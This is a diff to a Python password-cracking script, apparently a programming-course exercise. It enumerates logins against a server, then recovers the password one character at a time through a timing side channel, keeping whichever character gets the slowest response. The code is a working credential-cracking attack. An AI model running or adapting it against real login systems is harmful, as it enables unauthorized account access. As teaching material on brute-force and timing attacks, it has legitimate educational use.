@@ -5,6 +5,7 @@ from itertools import product
 import requests
 import os
 import json
+import time
 
 class PasswordGenerator:
     def __init__(self, charset='abcdefghijklmnopqrstuvwxyz1234567890'):
@@ -75,6 +76,7 @@ class PasswordCracker:
             # Step 1: Find correct login
             correct_login = None
             for login in self.generator.generate():
+                start = time.perf_counter()
                 response = self.try_password({'login': login, 'password': ''})
                 if response.get("result") == "Wrong password!":
                     correct_login = login
@@ -85,18 +87,24 @@ class PasswordCracker:
             if correct_login:
                 password = ''
                 while True:
+                    max_delay = 0
+                    next_char = ''
                     for char in charset:
                         attempt = password + char
+                        start = time.perf_counter()
                         response = self.try_password({'login': correct_login, 'password': attempt})
-                        result = response.get("result")
+                        elapsed = time.perf_counter() - start
 
-                        if result == "Connection success!":
-                            print(json.dumps({'login': correct_login, 'password': attempt}))
-                            sys.exit()
 
-                        if result == "Exception happened during login":
-                            password += char
-                            break  # try next character
+                        if response.get("result") == "Connection success!":
+                            result = json.dumps({'login': correct_login, 'password': attempt})
+                            return result
+
+                        if elapsed > max_delay:
+                            max_delay = elapsed
+                            next_char = char
+
+                    password += next_char
 
         finally:
             if self.client_socket:
